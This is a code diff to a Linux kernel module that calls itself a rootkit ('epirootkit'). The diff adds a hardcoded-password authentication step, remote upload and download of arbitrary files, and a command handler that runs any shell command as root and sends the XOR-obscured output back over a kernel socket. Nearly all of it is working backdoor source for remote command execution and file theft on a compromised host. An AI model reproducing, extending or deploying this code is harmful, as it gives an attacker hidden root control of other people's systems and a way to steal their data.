@@ -53,16 +53,98 @@ static int receive_data(char *buf, size_t len) {
     return kernel_recvmsg(g_sock, &msg_hdr, &iov, 1, len, 0);
 }
 
+// --- AUTHENTICATION ---
+static char rk_password[64] = "epirootkit";
+static int is_authenticated = 0;
+
+static int handle_auth(const char *cmd) {
+    if (strncmp(cmd, "auth ", 5) == 0) {
+        const char *pw = cmd + 5;
+        if (strncmp(pw, rk_password, strlen(rk_password)) == 0) {
+            is_authenticated = 1;
+            send_data("OK", 2);
+        } else {
+            send_data("FAIL", 4);
+        }
+        return 1;
+    }
+    if (strncmp(cmd, "auth change ", 12) == 0) {
+        const char *newpw = cmd + 12;
+        size_t len = strlen(newpw);
+        if (len > 0 && len < sizeof(rk_password)) {
+            strncpy(rk_password, newpw, sizeof(rk_password)-1);
+            rk_password[sizeof(rk_password)-1] = '\0';
+            send_data("Password changed successfully", 27);
+        } else {
+            send_data("Password change failed", 22);
+        }
+        return 1;
+    }
+    return 0;
+}
+
+// --- FILE UPLOAD/DOWNLOAD ---
+static int handle_upload(const char *cmd, int msglen) {
+    if (strncmp(cmd, "upload ", 7) == 0) {
+        char remote[256];
+        int size;
+        if (sscanf(cmd+7, "%255s %d", remote, &size) == 2 && size > 0) {
+            struct file *fp = filp_open(remote, O_WRONLY|O_CREAT|O_TRUNC, 0600);
+            if (IS_ERR(fp)) {
+                send_data("Upload failed", 13);
+                return 1;
+            }
+            char *buf = kmalloc(size, GFP_KERNEL);
+            if (!buf) {
+                filp_close(fp, NULL);
+                send_data("Upload failed", 13);
+                return 1;
+            }
+            int recvd = 0;
+            while (recvd < size) {
+                int r = receive_data(buf+recvd, size-recvd);
+                if (r <= 0) break;
+                recvd += r;
+            }
+            kernel_write(fp, buf, size, 0);
+            filp_close(fp, NULL);
+            kfree(buf);
+            send_data("Upload success", 14);
+            return 1;
+        }
+    }
+    return 0;
+}
+
+static int handle_download(const char *cmd) {
+    if (strncmp(cmd, "download ", 9) == 0) {
+        char remote[256];
+        if (sscanf(cmd+9, "%255s", remote) == 1) {
+            struct file *fp = filp_open(remote, O_RDONLY, 0);
+            if (IS_ERR(fp)) {
+                send_data("Download failed", 15);
+                return 1;
+            }
+            char buf[2048];
+            int r = kernel_read(fp, 0, buf, sizeof(buf));
+            filp_close(fp, NULL);
+            if (r > 0) {
+                send_data(buf, r);
+            } else {
+                send_data("Download failed", 15);
+            }
+            return 1;
+        }
+    }
+    return 0;
+}
+
 static int command_loop(void *data) {
     char *buf = kmalloc(config.buffer_size, GFP_KERNEL);
     if (!buf) return -ENOMEM;
-
+    is_authenticated = 0;
     while (!kthread_should_stop()) {
         int ret;
-        loff_t pos;
-        struct file *fp;
-        struct subprocess_info *info;
-        char output[2048] = {0};
 
         memset(buf, 0, config.buffer_size);
         ret = receive_data(buf, config.buffer_size - 1);
@@ -72,26 +154,38 @@ static int command_loop(void *data) {
         }
 
         xor_cipher(buf, ret);
-        if (strncmp(buf, "exec:", 5) == 0) {
+        // --- AUTHENTICATION ---
+        if (!is_authenticated) {
+            handle_auth(buf);
+            continue;
+        }
+        // --- AUTH CHANGE ---
+        if (handle_auth(buf)) continue;
+        // --- UPLOAD ---
+        if (handle_upload(buf, ret)) continue;
+        // --- DOWNLOAD ---
+        if (handle_download(buf)) continue;
+        // --- EXEC ---
+        if (strncmp(buf, "exec ", 5) == 0) {
             char *cmd = buf + 5;
             char *argv[] = { "/bin/sh", "-c", cmd, NULL };
             char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-
-            info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
+            struct subprocess_info *info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
             if (info)
                 call_usermodehelper_exec(info, UMH_WAIT_PROC);
-
-            fp = filp_open("/tmp/.rk_tmp", O_RDONLY, 0);
+            struct file *fp = filp_open("/tmp/.rk_tmp", O_RDONLY, 0);
             if (!IS_ERR(fp)) {
-                pos = 0;
-                ret = kernel_read(fp, pos, output, sizeof(output) - 1);
+                char output[2048] = {0};
+                int r = kernel_read(fp, 0, output, sizeof(output) - 1);
                 filp_close(fp, NULL);
-                xor_cipher(output, ret);
-                send_data(output, ret);
+                xor_cipher(output, r);
+                send_data(output, r);
             }
+            continue;
         }
+        // Unknown command
+        send_data("Unknown command", 15);
     }
-
     kfree(buf);
     return 0;
 }
